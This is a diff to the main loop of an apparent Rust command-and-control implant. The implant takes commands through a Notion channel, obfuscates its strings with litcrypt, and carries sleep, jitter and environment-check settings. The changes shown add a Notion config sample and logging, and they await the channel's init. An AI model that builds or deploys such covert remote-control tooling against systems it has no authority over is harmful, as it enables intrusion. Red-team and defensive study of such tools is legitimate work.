@@ -22,7 +22,7 @@ use litcrypt::{lc, use_litcrypt};
 
 mod config;
 pub mod channels;
-use channels::{Channel, ChannelType};
+use channels::{Channel, ChannelType, notion::{NotionChannel, NotionConfig}};
 use config::{
     ConfigOptions,
     get_config_options, 
@@ -33,13 +33,38 @@ use config::{
 mod cmd;
 use cmd::{AgentCommand, CommandType};
 mod logger;
+use logger::Logger;
 use logger::log_out;
 mod env_check;
+use serde_json::to_string;
 
 use_litcrypt!();
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+
+    // let sample_channel_config = NotionConfig {
+    //     api_key: "TEST123".to_string(),
+    //     parent_page_id: "PARENTTEST".to_string(),
+    //     page_id: String::new() 
+    // };
+
+    // let sample_config = ConfigOptions {
+    //     sleep_interval: 0,
+    //     jitter_time: 0,
+    //     log_level: 0,
+    //     launch_app: "TEST".to_string(),
+    //     config_file_path: "cfg.json".to_string(),
+    //     env_checks: vec![],
+    //     channel_type: ChannelType::Notion(NotionChannel {
+    //         config: sample_channel_config,
+    //         client: Client::new(),
+    //         logger: Logger::new(0),
+    //     }),
+    // };
+
+    // let cfg_str = to_string(&sample_config).unwrap();
+    // println!("{cfg_str}");
 
     // Log start
     println!("{}", lc!("[*] Starting!"));
@@ -83,8 +108,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     };
 
+    // Assign logger
+    channel.logger = Logger::new(config_options.log_level.clone());
+
+    logger.info(log_out!("Made it to init"));
     // Initialize Channel.
-    channel.init();
+    channel.init().await.unwrap();
 
     // Start Notion App if configured to do so
     // TODO: Replace with launch_app abstraction
@@ -141,9 +170,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     //  c. Send results
     // 4. Watch for shutdown commands
 
- 
+    logger.info(log_out!("Starting main loop"));
     loop {
 
+        logger.info(log_out!("Retrieving commands"));
         let commands: Vec<AgentCommand>  = channel.receive().await.unwrap();
 
         for mut c in commands {
